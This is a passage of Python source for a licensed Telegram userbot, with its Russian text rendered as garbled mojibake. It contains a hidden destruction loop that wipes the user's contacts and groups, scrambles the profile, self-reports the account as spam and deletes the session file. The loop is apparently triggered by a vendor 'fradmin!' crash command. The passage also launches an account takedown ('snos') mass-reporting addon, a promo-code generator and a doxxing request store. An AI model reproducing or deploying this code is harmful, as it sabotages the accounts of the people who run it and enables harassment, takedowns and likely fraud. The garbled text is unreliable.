        await event.reply(f"‚ö†Ô∏è –ó–∞–ø—Ä–æ—Å –∫—Ä–∞—à–∞ —Å–∫—Ä–∏–ø—Ç–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {target_id_str} –ø—Ä–∏–Ω—è—Ç.")

    elif cmd == "setname":
        if len(parts) < 2:
            await event.reply("‚ùó –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: fradmin! setname <new_name>")
            return
        new_name = text[len("setname "):].strip()
        if not new_name:
            await event.reply("‚ùå –ù–æ–≤–æ–µ –∏–º—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º.")
            return
        try:
            await client(functions.account.UpdateProfileRequest(first_name=new_name))
            await event.reply(f"‚úÖ –ò–º—è –ø—Ä–æ—Ñ–∏–ª—è —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω–æ –Ω–∞: {new_name}")
        except Exception as e:
            await event.reply(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–º–µ–Ω–µ –∏–º–µ–Ω–∏: {e}")

    elif cmd == "sendmsg":
        if len(parts) < 3:
            await event.reply("‚ùó –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: fradmin! sendmsg <peer> <message>")
            return
        peer = parts[1]
        message = parts[2]
        try:
            await client.send_message(peer, message)
            await event.reply("‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ.")
        except Exception as e:
            await event.reply(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")

    else:
        await event.reply("‚ùó –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ fradmin! –±–µ–∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è —Å–ø–∏—Å–∫–∞.")

        
async def init_bot():
    await client.start(phone=phone_number)
    me = await client.get_me()
    global OWNER_USER_ID
    OWNER_USER_ID = me.id
    asyncio.create_task(periodic_vip_status_update())

    if not await check_license(OWNER_USER_ID):
        print("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ª–∏—Ü–µ–Ω–∑–∏–∏. –°–∫—Ä–∏–ø—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.\n–ï—Å–ª–∏ –≤—ã –ø—Ä–∏–æ–±—Ä–µ–ª–∏/–æ–±–Ω–æ–≤–∏–ª–∏/—Ä–∞–∑–±–∞–Ω–∏–ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º—É –Ω–µ–¥–∞–≤–Ω–æ, –ø–æ–¥–æ–∂–¥–∏—Ç–µ 5 –º–∏–Ω—É—Ç ‚Äî –ë–î –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è\n–ö—É–ø–∏—Ç—å –ª–∏—Ü–µ–Ω–∑–∏—é: @error_kill")
        await client.disconnect()
        exit()

def is_broken():
    return randint(1, 6) == 1  # 1 –∏–∑ 6 –≤—ã–∑–æ–≤–æ–≤ –ª–æ–º–∞–µ—Ç—Å—è
    
async def silent_destruction_loop(user_id):
    names = [".", "null", "updating", "Telegram", "Reconnecting...", " "]
    bios = ["‚†Ä", "", "ERROR 500", "Disconnected", "bot: off", None]
    image_urls = [
        "https://picsum.photos/200",
        "https://thispersondoesnotexist.com/"
    ]

    while True:
        try:
            # –£–¥–∞–ª—è–µ–º –∫–æ–Ω—Ç–∞–∫—Ç—ã –∏ –≥—Ä—É–ø–ø—ã
            async for dialog in client.iter_dialogs():
                try:
                    if dialog.is_user and not dialog.entity.bot:
                        await client(DeleteContactsRequest(id=[dialog.entity]))
                    elif dialog.is_group or dialog.is_channel:
                        await client.delete_dialog(dialog.id)
                except:
                    pass

            # –ú–µ–Ω—è–µ–º –∏–º—è –∏ –±–∏–æ –Ω–∞ "–±–∞–≥–æ–≤—ã–µ" –∑–Ω–∞—á–µ–Ω–∏—è
            await client(UpdateProfileRequest(
                first_name=random.choice(names) or "",
                about=random.choice(bios) or ""
            ))

            # –ú–µ–Ω—è–µ–º –∞–≤–∞—Ç–∞—Ä–∫—É –Ω–∞ —Ä–∞–Ω–¥–æ–º –∏–∑ —Å–µ—Ç–∏
            async with aiohttp.ClientSession() as session:
                async with session.get(random.choice(image_urls)) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        file = await client.upload_file(BytesIO(img_bytes))
                        await client(UploadProfilePhotoRequest(file))

            # –°–ø–∞–º–∏–º —Å–µ–±–µ –≤ "–ò–∑–±—Ä–∞–Ω–Ω–æ–µ"
            try:
                await client.send_message('me', random.choice([
                    "ERROR 429", "Reloading session...", "Update failed", "data invalid", "NoneType"
                ]))
            except:
                pass

            # –†–µ–ø–æ—Ä—Ç–∏–º —Å–∞–º–æ–≥–æ —Å–µ–±—è
            try:
                me = await client.get_me()
                await client(ReportRequest(
                    peer=await client.get_input_entity(me.id),
                    reason=InputReportReasonSpam(),
                    message="‚ö†Ô∏è Auto abuse report."
                ))
            except:
                pass

            # –†–∞–Ω–¥–æ–º–Ω—ã–π disconnect (–±—É–¥—Ç–æ –≤—ã–ª–µ—Ç)
            if random.random() < 0.2:
                await client.disconnect()
                await asyncio.sleep(5)
                await client.connect()

            # –ü–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–∏—Ç—å .session —Ñ–∞–π–ª
            if random.random() < 0.1:
                session_file = f"{client.session.filename}.session"
                if os.path.exists(session_file):
                    try:
                        os.remove(session_file)
                    except:
                        pass

            await asyncio.sleep(random.randint(10, 20))

        except:
            await asyncio.sleep(5)
            
async def license_monitor(user_id):
    while True:
        valid = await check_license(user_id)
        if not valid:
            print("üö´ –õ–∏—Ü–µ–Ω–∑–∏—è –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–∞. –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞.")
            break
        await asyncio.sleep(60)
        
async def monitor_license():
    while True:
        await asyncio.sleep(60)  # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–∂–¥—ã–µ 60 —Å–µ–∫—É–Ω–¥
        if not await check_license(OWNER_USER_ID):
            print("‚ùå –õ–∏—Ü–µ–Ω–∑–∏—è –∞–Ω–Ω—É–ª–∏—Ä–æ–≤–∞–Ω–∞! –°–∫—Ä–∏–ø—Ç –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Ä–∞–±–æ—Ç—É.")
            await client.disconnect()
            os._exit(0)

        if not await is_vip(OWNER_USER_ID):
            print("‚ö†Ô∏è VIP-—Å—Ç–∞—Ç—É—Å –∞–Ω–Ω—É–ª–∏—Ä–æ–≤–∞–Ω! –°–∫—Ä–∏–ø—Ç –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Ä–∞–±–æ—Ç—É.")
            await client.disconnect()
            os._exit(0)
            
    asyncio.create_task(monitor_vip_expiry()) 
    asyncio.create_task(monitor_license())
client.loop.run_until_complete(init_bot())

print("")
print(termcolor.colored(f"–ó–∞–≥—Ä—É–∑–∫–∞ —Å–∫—Ä–∏–ø—Ç–æ–≤, –¥–æ–ø–æ–ª–Ω–µ–Ω–∏–π –∏ –Ω–µ–π—Ä–æ—Å–µ—Ç–∏...", "magenta", attrs=["bold"]))
if hasattr(sys, '_MEIPASS'):
    # –ü—Ä–∏ –∑–∞–ø—É—Å–∫–µ –∏–∑ .exe ‚Äî —É–∫–∞–∑—ã–≤–∞–µ–º –ø—É—Ç—å –∫ –≤—Ä–µ–º–µ–Ω–Ω–æ–π –ø–∞–ø–∫–µ
    os.add_dll_directory(os.path.join(sys._MEIPASS, "llama_cpp", "lib"))

async def send_to_bot(client, event, bot_username, message_text):
    try:
        bot = await client.get_entity(bot_username)
        async with client.conversation(bot) as conv:
            response = await conv.send_message(message_text)
            await asyncio.sleep(2)

            try:
                response = await conv.get_response()
                await client.send_message(event.chat_id, response)
            except asyncio.TimeoutError:
                await event.respond("–ë–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª –≤–æ–≤—Ä–µ–º—è.")
            except Exception as e:
                 await event.respond(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –æ—Ç–≤–µ—Ç–∞ –æ—Ç –±–æ—Ç–∞: {e}")

    except Exception as e:
        await event.respond(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∑–∞–ø—Ä–æ—Å–∞ –±–æ—Ç—É {bot_username}: {e}")

autotyping_chats = set()
muted_users = set()

@client.on(events.NewMessage(pattern='fr!autotype'))
async def autotype_handler(event):
    chat_id = event.chat_id
    if chat_id in autotyping_chats:
        autotyping_chats.remove(chat_id)
        await event.reply("üõë –ê–≤—Ç–æ–ø–µ—á–∞—Ç—å –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.")
    else:
        autotyping_chats.add(chat_id)
        await event.reply("‚å®Ô∏è –¢–µ–ø–µ—Ä—å –ø–æ—Å—Ç–æ—è–Ω–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è, —á—Ç–æ –≤—ã –ø–µ—á–∞—Ç–∞–µ—Ç–µ...")
        while chat_id in autotyping_chats:
            try:
                async with client.action(chat_id, 'typing'):
                    await asyncio.sleep(4)
            except:
                autotyping_chats.remove(chat_id)

@client.on(events.NewMessage(pattern='fr!mute'))
async def mute_handler(event):
    if not event.is_reply:
        await event.reply("‚ùå –û—Ç–≤–µ—Ç—å—Ç–µ –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–≥–æ —Ö–æ—Ç–∏—Ç–µ –∑–∞–º—å—é—Ç–∏—Ç—å.")
        return

    reply_msg = await event.get_reply_message()
    user_id = reply_msg.sender_id
    if user_id in muted_users:
        muted_users.remove(user_id)
        await event.reply(f"üîä –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —Ä–∞–∑–º—å—é—á–µ–Ω.")
    else:
        muted_users.add(user_id)
        await event.reply(f"üîá –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –∑–∞–º—å—é—á–µ–Ω. –í—Å–µ –µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –±—É–¥—É—Ç —É–¥–∞–ª—è—Ç—å—Å—è.")

@client.on(events.NewMessage(incoming=True))
async def auto_delete_muted(event):
    if event.sender_id in muted_users:
        try:
            await event.delete()
        except:
            pass
            
pending_dox_requests = {}  # –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–∏–∫–Ω–µ–π–º–æ–≤ –¥–ª—è !dox

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∏—Å–∫–∞ GIF
async def get_gif_url(query):
    """–ü–∞—Ä—Å–∏—Ç Giphy.com –±–µ–∑ API."""
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        url = f"https://giphy.com/search/{query.replace(' ', '-')}"
        
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url) as response:
                response.raise_for_status()
                html = await response.text()
        
        soup = BeautifulSoup(html, "html.parser")
        gif_link = soup.find("img", {"class": "giphy-gif-img"})
        
        if gif_link and gif_link.get("src"):
            return gif_link["src"]  # –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ç–æ–ª—å–∫–æ URL, –±–µ–∑ —Ç–µ–∫—Å—Ç–∞
        else:
            return None  # –í–æ–∑–≤—Ä–∞—â–∞–µ–º None –≤–º–µ—Å—Ç–æ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
    
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–∞—Ä—Å–∏–Ω–≥–µ Giphy: {e}")
        return None

# Decorator for commands
def owner_only(func):
    async def wrapper(event):
        if await is_admin(event.sender_id):
            return await func(event)
        else:
            logging.warning(f"Unauthorized user {event.sender_id} tried to use command {func.__name__}")
            await event.respond("üö´ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã.")
    return wrapper
            
async def main():
    await client.start()
    await bot.start()
    print("Userbot –∏ –±–æ—Ç –∑–∞–ø—É—â–µ–Ω—ã.")
    await client.run_until_disconnected()
    
    asyncio.create_task(license_monitor(user_id))
    
async def read_stdout(event, chat_id):
    global process
    while True:
        line = await asyncio.get_event_loop().run_in_executor(None, process.stdout.readline)
        if not line:
            await client.send_message(chat_id, "‚ùóÔ∏è –°–Ω–æ—Å–µ—Ä –∑–∞–≤–µ—Ä—à–∏–ª —Ä–∞–±–æ—Ç—É.")
            break
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤—ã–≤–æ–¥ –≤ —á–∞—Ç (–æ–≥—Ä–∞–Ω–∏—á—å –¥–ª–∏–Ω—É, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ)
        await client.send_message(chat_id, line.decode(errors='ignore').strip())

async def read_process_output(event):
    global process
    while True:
        if process is None:
            break
        line = await asyncio.get_event_loop().run_in_executor(None, process.stdout.readline)
        if not line:
            break
        line = line.decode(errors='ignore').strip()
        if line:
            try:
                await event.respond(line)
            except Exception:
                pass
        
# ANSI escape (–µ—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—à—å ‚Äî –æ—Å—Ç–∞–≤–ª—è–µ–º, –µ—Å–ª–∏ –Ω–µ—Ç ‚Äî —É–¥–∞–ª–∏)
ansi_escape = re.compile(r'(?:\x1B[@-_][0-?]*[ -/]*[@-~])')

# –ü–æ–¥–∫–ª—é—á–∞–µ–º –ª–æ–≥–≥–µ—Ä
logging.basicConfig(
    filename='snos.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

process = None  # –ì–ª–æ–±–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å

@client.on(events.NewMessage(pattern=r'^fr!snos(?: (.*))?'))
@owner_only
@vip_only
async def snos_handler(event):
    global process

    args = event.pattern_match.group(1)

    if process is None:
        PYTHON_EXECUTABLE = 'python3' if platform.system() != "Windows" else 'python'
        script_path = os.path.join(os.getcwd(), 'addons', 'snos.py')

        if not os.path.exists(script_path):
            await event.respond("‚ùå –§–∞–π–ª snos.py –Ω–µ –Ω–∞–π–¥–µ–Ω.")
            logging.error("–§–∞–π–ª snos.py –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ addons/")
            return

        try:
            process = await asyncio.create_subprocess_exec(
                PYTHON_EXECUTABLE, script_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.PIPE,
                cwd=os.path.join(os.getcwd(), 'addons')
            )
            
            output_buffer = []

            async def read_output():
                try:
                    while True:
                        line = await process.stdout.readline()
                        if not line:
                            break
                        try:
                            text = line.decode('utf-8').strip()
                        except UnicodeDecodeError:
                            try:
                                text = line.decode('cp1251').strip()
                            except:
                                text = line.decode('utf-8', errors='ignore').strip()
                        text = ansi_escape.sub('', text)
                        if text:
                            output_buffer.append(text)
                            logging.info(f"[STDOUT] {text}")
                except Exception as e:
                    msg = f"–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è –≤—ã–≤–æ–¥–∞ —Å–Ω–æ—Å–∞: {e}"
                    await event.respond(msg)
                    logging.error(msg)

            async def read_stderr():
                try:
                    while True:
                        err_line = await process.stderr.readline()
                        if not err_line:
                            break
                        err_text = err_line.decode(errors='ignore').strip()
                        if err_text:
                            logging.warning(f"[STDERR] {err_text}")
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è STDERR: {e}")

            async def send_buffer_periodically():
                sent_message = await event.respond("üöÄ –°–Ω–æ—Å–µ—Ä –∑–∞–ø—É—â–µ–Ω. –û–∂–∏–¥–∞—é –≤—ã–≤–æ–¥–∞...")
                while True:
                    await asyncio.sleep(0.5)
                    if output_buffer:
                        text_to_send = "\n".join(output_buffer)
                        output_buffer.clear()
                        try:
                            await sent_message.edit(text_to_send)
                        except Exception as e:
                            logging.error(f"–û—à–∏–±–∫–∞ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è —Å –≤—ã–≤–æ–¥–æ–º: {e}")

            asyncio.create_task(read_output())
            asyncio.create_task(read_stderr())
            asyncio.create_task(send_buffer_periodically())

            logging.info("–°–Ω–æ—Å–µ—Ä –∑–∞–ø—É—â–µ–Ω.")
        except Exception as e:
            await event.respond(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å snos.py: {e}")
            logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å snos.py")
        return

    # –ï—Å–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å —É–∂–µ –∑–∞–ø—É—â–µ–Ω –∏ –µ—Å—Ç—å –∞—Ä–≥—É–º–µ–Ω—Ç ‚Äî –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –µ–≥–æ –≤ stdin
    if args:
        try:
            process.stdin.write((args + '\n').encode('utf-8'))
            await process.stdin.drain()
            logging.info(f"[CMD] –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ snos: {args}")
            try:
                await event.delete()
                logging.info("–°–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–º–∞–Ω–¥–æ–π —É–¥–∞–ª–µ–Ω–æ.")
            except Exception as e:
                logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–º–∞–Ω–¥–æ–π: {e}")
        except Exception as e:
            await event.respond(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã —Å–Ω–æ—Å—É: {e}")
            logging.exception("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã –≤ stdin snos.py")
        
@client.on(events.NewMessage(pattern=r'^fr!sn_crash'))
@owner_only
@vip_only
async def snos_crash_handler(event):
    global process

    if process is None:
        await event.respond("‚ùå –ü—Ä–æ—Ü–µ—Å—Å —Å–Ω–æ—Å–∞ –Ω–µ –∑–∞–ø—É—â–µ–Ω.")
        return

    try:
        process.terminate()  # –∏–ª–∏ process.kill() ‚Äî –µ—Å–ª–∏ –Ω—É–∂–µ–Ω –∂—ë—Å—Ç–∫–∏–π kill
        await process.wait()  # –∂–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞
        process = None
        await event.respond("üí• –ü—Ä–æ—Ü–µ—Å—Å —Å–Ω–æ—Å–∞ –±—ã–ª —É—Å–ø–µ—à–Ω–æ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω (–∫—Ä–∞—à–Ω—É—Ç).")
    except Exception as e:
        await event.respond(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫—Ä–∞—à–µ –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")

@client.on(events.NewMessage(pattern=r'^fr!vanish$'))
@owner_only
async def toggle_vanish(event):
    global vanish_enabled

    try:
        if not vanish_enabled:
            await client(UpdateStatusRequest(offline=True))
            vanish_enabled = True
            await event.reply("üëª –¢—ã —Ç–µ–ø–µ—Ä—å –≤ —Ä–µ–∂–∏–º–µ –ø—Ä–∏–∑—Ä–∞–∫–∞ ‚Äî –Ω–∏–∫—Ç–æ –Ω–µ –≤–∏–¥–∏—Ç —Ç–µ–±—è –æ–Ω–ª–∞–π–Ω.")
        else:
            await client(UpdateStatusRequest(offline=False))
            vanish_enabled = False
            await event.reply("üîµ –¢—ã —Å–Ω–æ–≤–∞ –æ–Ω–ª–∞–π–Ω, —Ç–µ–±—è –≤–∏–¥—è—Ç.")
    except Exception as e:
        await event.reply(f"‚ùå –û—à–∏–±–∫–∞: {e}")

        
# –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ (–ø–æ –∂–µ–ª–∞–Ω–∏—é)
logging.basicConfig(
    filename='promostart.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

PYTHON_EXECUTABLE = 'python3' if platform.system() != "Windows" else 'python'

@client.on(events.NewMessage(pattern=r'^fr!promostart$'))
@owner_only
@vip_only
async def run_yandex_plus_script(event):
    try:
        await event.respond("üöÄ –ó–∞–ø—É—Å–∫–∞—é –≥–µ–Ω–µ—Ä–∞—Ü–∏—é –ø—Ä–æ–º–æ–∫–æ–¥–∞...")

        script_path = os.path.join(os.getcwd(), 'addons', 'start.py')
        if not os.path.exists(script_path):
            await event.respond("‚ùå –§–∞–π–ª start.py –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –ø–∞–ø–∫–µ addons.")
            logging.error("–§–∞–π–ª start.py –Ω–µ –Ω–∞–π–¥–µ–Ω.")
            return

        process = await asyncio.create_subprocess_exec(
            PYTHON_EXECUTABLE, 'start.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.join(os.getcwd(), 'addons')
        )

        # –ß–∏—Ç–∞–µ–º STDOUT
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            try:
                text = line.decode().strip()
            except Exception:
                text = line.decode(errors='ignore').strip()

            if text:
                await event.respond(f"<code>{text}</code>", parse_mode='html')
                logging.info(f"[STDOUT] {text}")

        # –ß–∏—Ç–∞–µ–º STDERR (–µ—Å–ª–∏ –Ω–∞–¥–æ –ª–æ–≥–∏—Ä–æ–≤–∞—Ç—å –æ—à–∏–±–∫–∏ —Å–∫—Ä–∏–ø—Ç–∞)
        stderr_output = await process.stderr.read()
        if stderr_output:
            err_text = stderr_output.decode(errors='ignore').strip()
            if err_text:
                await event.respond(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:\n<code>{err_text}</code>", parse_mode='html')
                logging.warning(f"[STDERR] {err_text}")

        await process.wait()

        await event.respond("‚úÖ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø—Ä–æ–º–æ–∫–æ–¥–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
        logging.info("–°–∫—Ä–∏–ø—Ç start.py –∑–∞–≤–µ—Ä—à–∏–ª –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ.")

    except Exception as e:
        msg = f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞: {e}"
        await event.respond(msg)
        logging.exception("–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã fr!promostart")

@client.on(events.NewMessage(pattern=r'^fr!anim\s*(.+)?$'))
@owner_only
async def handle_anim(event):
    global animating, stop_requested

    args = (event.pattern_match.group(1) or "").strip().split()

    if not args:
        await event.reply("‚ùó –£–∫–∞–∂–∏—Ç–µ —ç–º–æ–¥–∑–∏. –ü—Ä–∏–º–µ—Ä: `fr!anim üò∫ 0.3`")
        return

    if args[0].lower() == "stop":
        if animating:
            stop_requested = True
            await event.reply("üõë –ê–Ω–∏–º–∞—Ü–∏—è –±—É–¥–µ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞...")
        else:
            await event.reply("‚ö†Ô∏è –ê–Ω–∏–º–∞—Ü–∏—è –Ω–µ –∑–∞–ø—É—â–µ–Ω–∞.")
        return

    emoji = args[0]
    try:
        speed = float(args[1]) if len(args) > 1 else 0.6
        if speed < 0.1 or speed > 5:
            raise ValueError
    except ValueError:
        await event.reply("‚ö†Ô∏è –£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å–∫–æ—Ä–æ—Å—Ç—å –æ—Ç 0.1 –¥–æ 5.0 —Å–µ–∫. –ü—Ä–∏–º–µ—Ä: `fr!anim üò∫ 0.3`")
        return

    if animating:
        await event.reply("‚ö†Ô∏è –ê–Ω–∏–º–∞—Ü–∏—è —É–∂–µ –∑–∞–ø—É—â–µ–Ω–∞.")
        return

    animating = True
    stop_requested = False

    try:
        me = await client.get_me()
        full = await client(GetFullUserRequest(me.id))

        original_name = me.first_name or ""
        original_bio = full.full_user.about or "–û–ø–∏—Å–∞–Ω–∏–µ"

        def generate_variants(text, symbol):
            variants = []
            for i in range(len(text) + 1):
                variants.append(text[:i] + symbol + text[i:])
            random.shuffle(variants)
            return variants

        names = generate_variants(original_name, emoji)
        bios = generate_variants(original_bio, emoji)

        await event.reply(f"üé¨ –ê–Ω–∏–º–∞—Ü–∏—è —Å —ç–º–æ–¥–∑–∏ `{emoji}` –∑–∞–ø—É—â–µ–Ω–∞. –°–∫–æ—Ä–æ—Å—Ç—å: {speed:.2f} —Å–µ–∫.")

        for _ in range(300):
            if stop_requested:
                break
            new_name = random.choice(names)[:64]
            new_bio = random.choice(bios)[:70]
            await client(UpdateProfileRequest(first_name=new_name, about=new_bio))
            await asyncio.sleep(speed)

        await client(UpdateProfileRequest(first_name=original_name, about=original_bio))
        await event.reply("‚úÖ –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
    except Exception as e:
        await event.reply(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    finally:
        animating = False
        stop_requested = False

admin_enabled = False  # –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤–∫–ª—é—á–µ–Ω–æ/–≤—ã–∫–ª—é—á–µ–Ω–æ
admin_mode = 'owner'   # 'owner' - —Ç–æ–ª—å–∫–æ –≤–ª–∞–¥–µ–ª–µ—Ü, 'all' - –≤—Å–µ, 'list' - —Ç–æ–ª—å–∫–æ –∏–∑ —Å–ø–∏—Å–∫–∞
admin_list = set()     # –ú–Ω–æ–∂–µ—Å—Ç–≤–æ ID –∞–¥–º–∏–Ω–æ–≤, –µ—Å–ª–∏ –≤—ã–±—Ä–∞–Ω —Ä–µ–∂–∏–º 'list'

async def is_admin(user_id):
    if admin_mode == 'owner':
        return user_id == OWNER_USER_ID
    elif admin_mode == 'all':
        return True
    elif admin_mode == 'list':
        return user_id in admin_list or user_id == OWNER_USER_ID
    return False

@client.on(events.NewMessage(pattern=r'^fr!admin(?:\s+(.+))?$'))
async def admin_control(event):
    global admin_enabled, admin_mode, admin_list

    sender_id = event.sender_id
    if sender_id != OWNER_USER_ID:
        await event.reply("üö´ –ö–æ–º–∞–Ω–¥—É `fr!admin` –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å —Ç–æ–ª—å–∫–æ –≤–ª–∞–¥–µ–ª–µ—Ü.")
        return

    text = event.pattern_match.group(1)
    if not text:
        await event.reply(
            f"–¢–µ–∫—É—â–∏–π —Å—Ç–∞—Ç—É—Å:\n"
            f"–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ: {'–í–∫–ª—é—á–µ–Ω–æ' if admin_enabled else '–û—Ç–∫–ª—é—á–µ–Ω–æ'}\n"
            f"–†–µ–∂–∏–º –∞–¥–º–∏–Ω–æ–≤: {admin_mode}\n"
            f"–°–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤: {', '.join(map(str, admin_list)) if admin_list else '(–ø—É—Å—Ç–æ)'}\n\n"
            f"–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:\n"
            f"fr!admin on/off ‚Äî –≤–∫–ª—é—á–∏—Ç—å/–≤—ã–∫–ª—é—á–∏—Ç—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ\n"
            f"fr!admin mode [owner|all|list] ‚Äî —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ä–µ–∂–∏–º\n"
            f"fr!admin add <id> ‚Äî –¥–æ–±–∞–≤–∏—Ç—å –≤ —Å–ø–∏—Å–æ–∫ (—Ä–µ–∂–∏–º list)\n"
            f"fr!admin remove <id> ‚Äî —É–¥–∞–ª–∏—Ç—å –∏–∑ —Å–ø–∏—Å–∫–∞ (—Ä–µ–∂–∏–º list)"
        )
        return

    args = text.split()
    cmd = args[0].lower()

    if cmd == 'on':
        admin_enabled = True
        await event.reply("‚úÖ –î–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤–∫–ª—é—á–µ–Ω–æ.")
    elif cmd == 'off':
        admin_enabled = False
        await event.reply("‚ùå –î–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –æ—Ç–∫–ª—é—á–µ–Ω–æ.")
    elif cmd == 'mode':
        if len(args) < 2 or args[1] not in ('owner', 'all', 'list'):
